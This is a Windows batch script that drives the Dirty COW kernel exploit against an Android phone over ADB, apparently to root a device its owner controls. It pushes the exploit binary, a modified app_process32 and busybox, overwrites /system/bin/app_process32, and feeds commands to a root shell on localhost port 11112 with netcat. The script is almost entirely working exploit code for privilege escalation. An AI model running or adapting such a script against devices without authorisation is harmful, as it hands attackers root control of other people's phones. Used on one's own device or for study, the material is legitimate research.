::Set our Window Title
@title ROOT SHELL TEST
mode 100,30
::Set our default parameters
@echo off
color 0b
echo --------------------------------------------------------------------------------------------
echo --------------------------------------------------------------------------------------------
echo [*] BEFORE WE BEGIN THE SCRIPT WILL RUN "ADB DEVICES" AND SEE IF YOU HAVE DRIVERS INSTLLED
echo [*] THE NEEDED RESPONSE IS SIMILAR TO BELOW 
echo [*]
echo [*] List of devices attached
echo [*] ****************        device
echo [*] 
echo [*] INSTEAD OF STARS IT WILL BE YOUR SERIAL NUMBER 
echo [*] IF NO DEVICE LISTED YOU ARE NOT READY TO RUN THIS SCRIPT. CLOSE THIS WINDOW NOW IF NOT READY
echo [*] 
echo [*] IF DEVICE IS LISTED PRESS ANY KEY ON COMPUTER TO START
echo [*]
adb wait-for-device
adb devices
pause
echo [*] copying dirtycow to /data/local/tmp/dirtycow
adb push pushed/dirtycow.fast /data/local/tmp/dirtycow
timeout 2 > nul
echo [*] copying recowvery-app_process32 to /data/local/tmp/recowvery-app_process32
adb push pushed/recowvery-app_process32 /data/local/tmp/recowvery-app_process32
timeout 2 > nul
echo [*] copying busybox to /data/local/tmp/busybox
adb push pushed/busybox /data/local/tmp/busybox
timeout 2 > nul
echo [*] copying cp_comands.txt to /data/local/tmp/cp_comands.txt
adb push pushed/cp_comands.txt /data/local/tmp/cp_comands.txt
timeout 2 > nul
echo [*] changing permissions on copied files
adb shell chmod 0777 /data/local/tmp/*
timeout 2 > nul
::pause
echo --------------------------------------------------------------------------------------------
echo [*] DONE PUSHING FILES TO PHONE. NOW WE ARE GOING TO TEMP WRITE OVER THE APP_PROCESS
echo [*] WITH A MODIFIED VERSION THAT HAS lsh IN IT USING A SYSTEM-SERVER AS ROOT SHELL
echo [*] THIS STEP WILL CAUSE PHONE TO DO A SOFT REBOOT AND WILL NOT RESPOND TO BUTTON PUSHES
echo [*] timeout 15 seconds to read comments
timeout 15
adb shell /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/recowvery-app_process32
echo --------------------------------------------------------------------------------------------
echo --------------------------------------------------------------------------------------------
echo --------------------------------------------------------------------------------------------
echo [*]WAITING 60 SECONDS FOR ROOT SHELL TO SPAWN
timeout 60
echo --------------------------------------------------------------------------------------------
echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
echo [*] CREATE A NEW DIRECTORY AS A TEST
echo [*] CHANGING PERMISSIONS ON NEW DIRECTORY
echo [*] COPY busybox FROM tmp TO test SO IT BECOMES OWNED  BY ROOT
adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_comands.txt"
echo [*]  
echo --------------------------------------------------------------------------------------------
echo --------------------------------------------------------------------------------------------
echo [*] THERE WAS THE PROOF OF CONCEPT
echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
pause
echo [*]  
echo --------------------------------------------------------------------------------------------
echo --------------------------------------------------------------------------------------------
echo [*] NOW WE REBOOT PHONE TO RESET THE FILES DIRTYCOW CHANGED
echo [*] 
echo [*] PRESS ENTER KEY TO FINISH THIS SCRIPT AND REBOOT TO RESTORE PHONE
pause
adb reboot
exit